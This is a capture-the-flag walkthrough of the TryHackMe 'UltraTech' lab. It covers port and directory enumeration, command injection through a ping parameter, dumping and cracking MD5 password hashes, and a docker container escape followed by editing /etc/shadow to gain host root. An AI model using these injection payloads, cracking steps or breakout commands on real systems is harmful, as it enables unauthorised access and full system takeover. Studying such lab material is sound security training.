---
date: 2025-01-03
categories: [CTF, THM]
title: "THM - UltraTech"
tags: ['docker breakout', 'gobuster', 'hashcat', 'nmap', 'privilege escalation', 'rce', 'sqli']

description: "UltraTech - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - UltraTech

NMAP
```bash
nmap 10.10.200.110 -p- -T5
```

![image1](../resources/336adee1e2a847c7bca8480b6abebc97.png)

```bash
nmap 10.10.200.110 -p 31331 -A
```

![image2](../resources/29ecbbb1da6341daa229d6034f4d8ee3.png)

- Directory bruteforcing:
```bash
gobuster dir -u http://10.10.200.110:8081 -w /usr/share/seclists/Discovery/Web-Content/big.txt

```

![image3](../resources/f6280d75e7ba4a19889faa87d2aee99d.png)

```bash
gobuster dir -u http://10.10.200.110:31331 -w /usr/share/seclists/Discovery/Web-Content/big.txt

```

![image4](../resources/b77d1e1548394ea39d343f7fa0244801.png)

/robots.txt


![image5](../resources/8ec45d670672469f8de522d57b5c73fd.png)

/utech_sitemap.txt


![image6](../resources/a7f0c6ca8c72487bb0ce1977835565fb.png)

/partners.html


![image7](../resources/8ea6a40830084b6488e6907a835d49fd.png)

Got a login page

- Look at traffic in Burp
Looking at  `http://10.10.200.110:31331/partners.html`

The site constantly pings to see if the server is online


![image8](../resources/04192fa6ad5340638b54a7509fbae77a.png)

- Changing the parameters of the GET request we can get RCE

[URL encoding cheatsheet](https://www.eso.org/~ndelmott/url_encode.html)

- Normal space is url encoded as **%20**

- A **line feed** (0x0A) is url encoded as **%0A**
A line feed means moving one line forward. The code is **\n**

- You need to use a line feed character (**\n**) URL encoded because a normal space doesn't work

```bash
GET /ping?ip=10.10.200.110%0Als

```

![image9](../resources/7c03b9d409cc454ba470967f25716186.png)

```bash
GET /ping?ip=10.10.200.110%0Acat%20utech.db.sqlite

```

![image10](../resources/ba3f82b8006d4285ab4f9e60d344cce1.png)

(ignore the M before the names)

Found hashes:

**r00t : f357a0c52799563c7c7b76c1e7543a32**

**admin : 0d0ea5111e3c1def594c1684e3b9be84**

```bash
hash-identifier

```

![image11](../resources/603611db9b3d434cb445ee17cce637fe.png)


![image12](../resources/4da5a4e986fb4298abb1dccf4b8a7d3a.png)

- Crack with hashcat
```bash
hashcat -m 0 -a 0 hashes /usr/share/wordlists/rockyou.txt

```

![image13](../resources/ce79b4f12e29423b8e2f3a9ee2f41500.png)

- Credentials:
**r00t : n100906**

**admin : mrsheafy**

- SSH with r00t

![image14](../resources/2b769bfa5fdc49cc8c8f54a4bab7f530.png)


![image15](../resources/95fc6f33053545219c13463a93df6f13.png)
- We can see we are in the docker group

- **<u>Escape the container:</u>**

```bash
docker images

```

![image16](../resources/e70b9fee7aff4f11b8061dc5b34fc431.png)

- **<u>In Practise:</u>**

- Check gtfobins <https://gtfobins.github.io/gtfobins/docker/> for the command:


![image17](../resources/294a17f538654586a8ece330796ca81d.png)

- If we run this command we'll get an error:

![image18](../resources/3b2e0202b0394cf2b17cd2b78fea5eb7.png)

- So we need to list the available images:

```bash
docker ps -a

```

![image19](../resources/9866d3f6063d4a248c1d6726631f6379.png)

- Change the image name to **bash**

**Option 1 - command:**

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh

What this command does is, it creates a new container and mounts the entire ultratech-prod filesystem / to this container

```

![image20](../resources/7d683de391344a229b39081e78df1286.png)

**Option 2 - Command:**

```bash
docker run -v /:/mnt -it bash
```
What this command does is similar to Option 1, it creates a new container and mounts the entire ultratech-prod filesystem **/**. But it mounts it to **/mnt** on the container



![image21](../resources/2f7d8f390a9e4cf9b741c39d94275e78.png)


![image22](../resources/6e29f47e114f41b4a123e28a045d69ef.png)

- **We are root (in the container)**
- We can now read all the root files

- <u>To get root on the host machine (using Option 1):</u>

- On Kali - Make a MD5 hash:

```bash
mkpasswd -m md5 pass123

```

![image23](../resources/8725cc9f13d94b6682a120a9970ceec0.png)

- On the target - in the container (because we're root now)
```bash
vi /etc/shadow

```
Press **i** (for insert)

Remove the hash of the root user (second field) and replace with the hash you made


![image24](../resources/5dbfc491ee1545f6b2e3408768a6efd4.png)

```bash
Press ESC

Press :wq

ENTER

```
- exit out of the container
```bash
exit

```
```bash
su root
```
Enter password you made


![image25](../resources/4624215e87734191914682913d6ab4dc.png)


![image26](../resources/59e067c95da64a05be4f3853aefdb08f.png)